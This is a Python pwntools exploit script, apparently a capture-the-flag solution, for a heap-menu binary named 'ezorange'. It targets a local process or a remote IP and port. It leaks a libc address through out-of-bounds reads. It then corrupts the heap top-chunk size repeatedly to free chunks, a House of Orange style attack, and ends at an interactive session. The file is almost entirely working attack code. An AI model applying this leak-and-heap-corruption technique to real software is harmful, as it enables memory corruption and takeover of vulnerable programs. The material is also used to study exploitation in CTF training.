#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./ezorange_patched")
libc = ELF("./libc.so.6")

# change -l0 to -l1 for more gadgets
#def one_gadget(filename, base_addr=0):
#  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]
#onegadgets = one_gadget(libc.path, libc.address)

rop = ROP(exe)

host, port = "104.197.118.147", "10160"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])
  raw_input("DEBUG")

def buy(idx,size):
  p.sendlineafter('> ', '1')
  p.sendlineafter(': ', str(idx))
  p.sendlineafter(': ', str(size))

def modify(idx, cell, val=0):
  p.sendlineafter('> ', '2')
  p.sendlineafter(': ', str(idx)) 
  p.sendlineafter(': ', str(cell))
  p.recvuntil('Current value: ',drop=True)
  retval = int(p.recvuntil('\n',drop=True),10)
  if (val<256):
    p.sendlineafter('New value: ', str(val))
  else:
    p.sendlineafter('New value: ', '+')
  return retval

buy(0, 0x18)
modify(0, 26, 0)
buy(1, 0x1000)

leak = 0
for i in range(6):
  leak += modify(0, 32+i, 256)<<(i<<3)

print('libc leak = '+hex(leak))
libc.address = leak - 0x1c5c00
print('libc base = '+hex(libc.address))

buy(0, 0x100)

buy(1,0xce0)
# modify top_chunk size to 0x301
modify(1, 0xce8, 1)
modify(1, 0xce9, 3)
modify(1, 0xcea, 0)
# free 1st 0x2e0 chunk
buy(1,0x1000)

buy(0, 0x100)

buy(1,0xce0)
# modify top_chunk size to 0x301
modify(1, 0xce8, 1)
modify(1, 0xce9, 3)
modify(1, 0xcea, 0)
# free second 0x2e0 chunk
buy(1,0x1000)

p.interactive()
